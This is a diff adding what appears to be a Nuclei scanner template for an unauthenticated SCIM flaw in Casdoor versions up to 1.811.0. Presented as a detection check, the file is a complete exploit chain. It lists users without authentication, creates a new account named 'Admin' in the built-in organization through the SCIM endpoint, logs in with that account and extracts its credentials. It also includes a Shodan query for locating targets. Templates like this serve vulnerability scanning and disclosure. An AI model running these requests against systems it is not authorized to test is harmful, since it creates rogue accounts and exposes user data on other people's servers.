@@ -1,0 +1,70 @@
+id: casdoor-unauth-operations
+
+info:
+  name: Casdoor <=v1.811.0 - Unauthenticated SCIM Operations
+  author: iamnoooob,rootxharsh,pdresearch
+  severity: critical
+  description: |
+    Detects unauthorized SCIM (System for Cross-domain Identity Management) operations in Casdoor versions ≤1.811.0, allowing unauthenticated access to user management functionalities.
+  metadata:
+    verified: true
+    max-request: 3
+    shodan-query: html:"Casdoor"
+  tags: casdoor,unauth,intrusive,misconfig
+
+variables:
+  username: "{{randstr}}"
+  password: "{{randstr_1}}"
+  email: "{{username}}@oast.fun"
+
+http:
+  - raw:
+      - |
+        GET /scim/Users HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"urn:ietf:params:scim:schemas:core:2.0:User","Resources", "emails")'
+          - 'contains(header,"casdoor_session_id") && status_code == 200'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        POST /scim/Users HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/scim+json-H
+
+        {"active":true,"displayName":"Admin","emails":[{"value":"{{email}}"}],"password":"{{password}}","nickName":"{{username}}","schemas":["urn:ietf:params:scim:schemas:core:2.0:User","urn:ietf:params:scim:schemas:extension:enterprise:2.0:User"],"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User":{"organization":"built-in"},"userName":"{{username}}","userType":"normal-user"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"urn:ietf:params:scim:schemas:core:2.0:User",username)'
+          - 'status_code == 201'
+        internal: true
+        condition: and
+
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/plain;charset=UTF-8
+
+        {"application":"app-built-in","organization":"built-in","username":"{{username}}","autoSignin":true,"password":"{{password}}","signinMethod":"Password","type":"login"}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"\"status\": \"ok\"","data","msg","sub")'
+          - 'status_code == 200'
+        condition: and
+
+    extractors:
+      - type: dsl
+        dsl:
+          - '"Username: " + username'
+          - '"Password: " + password'
+# digest: 4a0a00473045022071e56c14f44eec687dc01027c0eff5b1e5c485d05cab682dac18126bbbc8d392022100bb804ec2d90db99b0e42c2cadffce57f925537dfebe1eb7cfab2a466f7b768bc:922c64590222798bb761d5b6d8e72950
